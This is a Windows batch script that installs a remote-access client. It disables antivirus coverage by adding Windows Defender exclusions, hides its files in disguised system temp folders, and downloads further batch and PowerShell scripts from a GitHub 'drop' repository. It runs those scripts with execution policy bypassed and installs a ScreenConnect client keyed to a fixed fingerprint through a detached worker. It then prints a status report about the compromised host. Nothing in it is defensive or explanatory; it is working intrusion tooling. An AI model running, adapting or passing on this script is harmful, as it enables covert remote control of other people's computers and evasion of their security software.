@echo off
rem OWN_GRYXA_FORCE BUILD 20260804F2 - force Gryxa + one-line REPORT (sevrz-safe, 10s)
rem F2: pipe-safe REPORT (ENSURE had QUEUED|detached=1 → cmd ran 'detached');
rem     install is ALWAYS detached so Guest 10s kill cannot abort msiexec.
rem Usage: own_gryxa_force.cmd
rem Exit: 0=HEALTHY now, 1=DOWN/queued/absent, 2=helper fetch fail
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "SVC=ScreenConnect Client (%FP%)"
set "LOG=%WD%\own_gryxa_force.log"
set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "CDN=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "WORKER=%WD%\own_gryxa_force_worker.cmd"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] force_begin host=%COMPUTERNAME%>>"%LOG%"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%CDN%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_lib.ps1" "%RAW%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_lib.ps1" "%CDN%/own_lib.ps1?t=%RANDOM%" >nul 2>&1

if not exist "%WD%\own_gryxa.cmd" (
  echo REPORT^|%COMPUTERNAME%^|%FP%^|FAIL^|reason=no-own_gryxa
  echo FAIL no own_gryxa.cmd>>"%LOG%"
  endlocal & exit /b 2
)

set "PRE=ABSENT"
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
)

set "ACTION=none"
if /I "%PRE%"=="ALIVE" (
  set "ACTION=skip-already-alive"
  goto :Report
)

rem write worker that does the slow install; parent returns REPORT in ^<5s
(
  echo @echo off
  echo setlocal EnableExtensions
  echo echo [%%DATE%% %%TIME%%] worker_begin^>^>"%LOG%"
  echo if exist "%WD%\own_lib.ps1" ^(
  echo   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Force -NoWait -WorkDir "%WD%" -Build F2 ^>^>"%LOG%" 2^>^&1
  echo ^)
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" ^>^>"%LOG%" 2^>^&1
  echo echo [%%DATE%% %%TIME%%] worker_done^>^>"%LOG%"
  echo endlocal
) >"%WORKER%"

start "" /b cmd /c "call \"%WORKER%\""
set "ACTION=queued-detached"
echo [%DATE% %TIME%] queued worker>>"%LOG%"

:Report
set "STATE=ABSENT"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "STATE=ABSENT"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" >nul && set "STATE=RUNNING"
  sc query "%SVC%" | findstr /I /C:"START_PENDING" >nul && set "STATE=START_PENDING"
  sc query "%SVC%" | findstr /I /C:"STOP_PENDING" >nul && set "STATE=STOP_PENDING"
  sc query "%SVC%" | findstr /I /C:"STOPPED" >nul && set "STATE=STOPPED"
)

set "HEALTH=DOWN"
if /I "!STATE!"=="RUNNING" set "HEALTH=HEALTHY"
if /I "!STATE!"=="START_PENDING" set "HEALTH=HEALTHY"
if /I "!STATE!"=="CONTINUE_PENDING" set "HEALTH=HEALTHY"
if /I "%ACTION%"=="queued-detached" if /I "!HEALTH!"=="DOWN" set "HEALTH=QUEUED"

set "DIR=0"
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"

echo.
echo ====== GRYXA REPORT ======
echo HOST=%COMPUTERNAME%
echo FP=%FP%
echo PRE=%PRE%
echo STATE=!STATE!
echo HEALTH=!HEALTH!
echo DIR=!DIR!
echo ACTION=!ACTION!
echo REPORT^|%COMPUTERNAME%^|%FP%^|!HEALTH!^|state=!STATE!^|dir=!DIR!^|pre=%PRE%^|action=!ACTION!
echo ==========================
echo tip: re-run in 60s for final HEALTHY/DOWN after msiexec>>"%LOG%"
echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE! ACTION=!ACTION!>>"%LOG%"

if /I "!HEALTH!"=="HEALTHY" ( endlocal & exit /b 0 )
if /I "!HEALTH!"=="QUEUED" ( endlocal & exit /b 1 )
endlocal & exit /b 1
